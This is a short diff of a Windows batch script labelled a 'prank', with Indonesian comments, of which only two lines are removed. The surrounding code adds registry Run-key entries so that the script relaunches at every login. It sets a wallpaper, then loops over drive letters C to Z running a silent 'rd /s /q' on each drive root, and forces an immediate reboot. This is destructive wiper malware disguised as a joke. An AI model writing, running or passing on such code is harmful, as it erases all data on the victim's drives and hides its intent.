@@ -42,7 +42,6 @@ if not exist "%hiddenPath%" (
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemPrank" /t REG_SZ /d "%APPDATA%\system_prank.bat" /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PersistentPrank" /t REG_SZ /d "%APPDATA%\system_prank.bat" /f
 
-:start_prank
 
 @echo off
 set "wallpaperPath=C:\Users\ISD\Documents\Dokumen\THRIVE.jpg"
@@ -317,6 +316,5 @@ for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     rd /s /q "%%d:\" >nul 2>&1
 )
 
-:: Menampilkan pesan selesai
 echo Proses selesai. Sistem akan restart...
 shutdown /r /t 0
